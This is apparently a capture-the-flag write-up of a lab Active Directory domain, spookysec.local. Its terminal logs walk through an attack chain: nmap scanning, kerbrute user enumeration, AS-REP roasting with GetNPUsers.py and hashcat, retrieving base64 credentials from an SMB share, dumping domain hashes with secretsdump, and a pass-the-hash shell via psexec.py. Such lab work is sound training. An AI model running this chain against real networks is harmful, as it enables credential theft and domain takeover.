# nmap
## -a
```console
kali@kali:~$ nmap -A 10.10.223.29 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 08:39 EDT
Nmap scan report for 10.10.223.29
Host is up (0.046s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-14 12:39:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)                                                           
3269/tcp open  tcpwrapped                                                                    
3389/tcp open  ms-wbt-server Microsoft Terminal Services                                     
| rdp-ntlm-info:                                                                             
|   Target_Name: THM-AD                                                                      
|   NetBIOS_Domain_Name: THM-AD                                                              
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC                                                   
|   DNS_Domain_Name: spookysec.local                                                         
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local                                   
|   Product_Version: 10.0.17763                                                              
|_  System_Time: 2020-06-14T12:42:07+00:00                                                   
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local                          
| Not valid before: 2020-04-03T18:40:09                                                      
|_Not valid after:  2020-10-03T18:40:09                                                      
|_ssl-date: 2020-06-14T12:42:22+00:00; +14s from scanner time.                               
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/14%Time=5EE61A8C%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 13s, deviation: 0s, median: 13s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-06-14T12:42:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
```
## port
```console
kali@kali:~$ nmap -p- 10.10.223.29                                                      
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 08:50 EDT                              
Nmap scan report for 10.10.223.29                                                            
Host is up (0.058s latency).                                                                 
Not shown: 65508 closed ports                                                                
PORT      STATE SERVICE                                                                      
53/tcp    open  domain                                                                       
80/tcp    open  http                                                                         
88/tcp    open  kerberos-sec                                                                 
135/tcp   open  msrpc                                                                        
139/tcp   open  netbios-ssn                                                                  
389/tcp   open  ldap                                                                         
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49687/tcp open  unknown
49694/tcp open  unknown
49791/tcp open  unknown
```

# enumerate user


```console
kali@kali:~/Downloads$ ./kerbrute_linux_amd64 userenum userlist.txt -d spookysec.local --dc 10.10.223.29

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/14/20 - Ronnie Flathers @ropnop

2020/06/14 09:20:57 >  Using KDC(s):
2020/06/14 09:20:57 >   10.10.223.29:88

2020/06/14 09:20:57 >  [+] VALID USERNAME:       james@spookysec.local
2020/06/14 09:20:58 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2020/06/14 09:20:59 >  [+] VALID USERNAME:       James@spookysec.local
2020/06/14 09:20:59 >  [+] VALID USERNAME:       robin@spookysec.local
2020/06/14 09:21:09 >  [+] VALID USERNAME:       darkstar@spookysec.local
2020/06/14 09:21:11 >  [+] VALID USERNAME:       administrator@spookysec.local
2020/06/14 09:21:16 >  [+] VALID USERNAME:       backup@spookysec.local
2020/06/14 09:21:18 >  [+] VALID USERNAME:       paradox@spookysec.local
2020/06/14 09:21:34 >  [+] VALID USERNAME:       JAMES@spookysec.local
2020/06/14 09:21:39 >  [+] VALID USERNAME:       Robin@spookysec.local
2020/06/14 09:22:10 >  [+] VALID USERNAME:       Administrator@spookysec.local
2020/06/14 09:23:12 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2020/06/14 09:23:33 >  [+] VALID USERNAME:       Paradox@spookysec.local
2020/06/14 09:24:37 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2020/06/14 09:24:56 >  [+] VALID USERNAME:       ori@spookysec.local
2020/06/14 09:25:30 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2020/06/14 09:29:44 >  Done! Tested 100000 usernames (16 valid) in 526.378 seconds
```

# Exploiting kerberos
```console
kali@kali:~/impacket/examples$ python3 GetNPUsers.py spookysec.local/svc-admin -dc-ip 10.10.223.29
Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation

Password:
[*] Cannot authenticate svc-admin, getting its TGT
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:hashhashhash
```

google hashcat example, find hash start with *krb5asrep*. now put hash in a file and use hashcat to crack it.

```console
kali@kali:~/THM/AD$ hashcat -m 18200 -a 0 -o crack.txt user.txt /home/kali/Downloads/passwordlist.txt --force #use given wordlist
kali@kali:~/THM/AD$ cat crack.txt # view carcked password
```

# Enumerate smb
```console
kali@kali:~/THM/AD$ smbclient -L \\\\10.10.223.29\\ -U svc-admin
Enter WORKGROUP\svc-admin's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
kali@kali:~/THM/AD$ smbclient \\\\10.10.223.29\\backup -U svc-admin
Enter WORKGROUP\svc-admin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 5268098 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit
kali@kali:~/impacket/examples$ cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```
its is a base64 so run
```console
kali@kali:~/THM/AD$ base64 -d backup_credentials.txt 
```

# Elevating Privileges 
```console
kali@kali:~/impacket/examples$ python3 secretsdump.py domain/user:password@ip
Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:LMHASH:NTHASH
```

I use ```psexec.py```, one of the ```impacket``` to gain shell with **pass the hash** attack
```console
python3 psexec.py  administrator@10.10.121.137 -hashes LMHASH:NTHASH
```

alternative
* crackmapexec
* Evil-WinRM

# flags
check desktop of each user